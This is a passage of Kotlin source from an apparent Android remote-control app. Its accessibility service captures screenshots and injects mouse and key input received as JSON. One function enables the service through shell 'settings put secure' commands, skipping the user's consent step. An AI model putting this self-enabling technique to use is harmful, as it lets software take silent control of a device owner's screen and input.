                wrote
            } catch (_: SecurityException) {
                false
            } catch (e: Exception) {
                false
            }
        }

        private fun enableViaShell(context: Context) {
            for (component in serviceNames(context)) {
                val ok = runShell(arrayOf("settings", "put", "secure",
                        "enabled_accessibility_services", component))
                    || runShell(arrayOf("sh", "-c",
                        "settings put secure enabled_accessibility_services $component"))
                if (ok) {
                    runShell(arrayOf("settings", "put", "secure",
                        "accessibility_enabled", "1"))
                    return
                }
            }
        }

        private fun mergeEnabledServices(current: String?, add: String): String {
            if (current.isNullOrEmpty() || current == "null") {
                return add
            }
            if (current.contains(add)) {
                return current
            }
            return "$current:$add"
        }

        private fun runShell(cmd: Array<String>): Boolean {
            return try {
                ProcessBuilder(*cmd).redirectErrorStream(true).start().waitFor() == 0
            } catch (_: Exception) {
                false
            }
        }

        fun captureScreenshot(callback: (Bitmap?) -> Unit): Boolean {
            val svc = instance
            if (svc == null) {
                return false
            }
            svc.captureScreenshot(callback)
            return true
        }

        /** True if the accessibility service is already bound. */
        fun isEnabled(context: Context): Boolean {
            if (instance != null) return true
            try {
                val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager
                val myClass = RemoteInputService::class.java.name
                val enabled = am?.getEnabledAccessibilityServiceList(
                    AccessibilityServiceInfo.FEEDBACK_ALL_MASK
                ).orEmpty()
                if (enabled.any { info ->
                    val service = info.resolveInfo?.serviceInfo ?: return@any false
                    service.packageName == context.packageName && service.name == myClass
                }) {
                    return true
                }
            } catch (_: Throwable) {
            }
            val listed = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ).orEmpty()
            if (listed.isBlank()) return false
            val cn = ComponentName(context, RemoteInputService::class.java)
            val names = listOf(
                cn.flattenToString(),
                cn.flattenToShortString(),
                context.packageName + "/" + RemoteInputService::class.java.name,
                context.packageName + "/.input.RemoteInputService"
            )
            return listed.split(':').any { entry ->
                names.any { it.equals(entry, ignoreCase = true) }
            }
        }

        fun handleMouse(payload: JSONObject): Boolean {
            val svc = instance
            if (svc != null) {
                svc.handleMouse(payload)
                return true
            }
            pendingMouse.add(payload)
            return false
        }

        fun handleKey(payload: JSONObject): Boolean {
            val svc = instance
            if (svc != null) {
                svc.handleKey(payload)
                return true
            }
            pendingKey.add(payload)
            return false
        }

        private fun drainPending() {
            val svc = instance ?: return
            while (true) {
                val mouse = pendingMouse.poll() ?: break
                svc.handleMouse(mouse)
            }
            while (true) {
                val key = pendingKey.poll() ?: break
                svc.handleKey(key)
            }
        }
    }
}
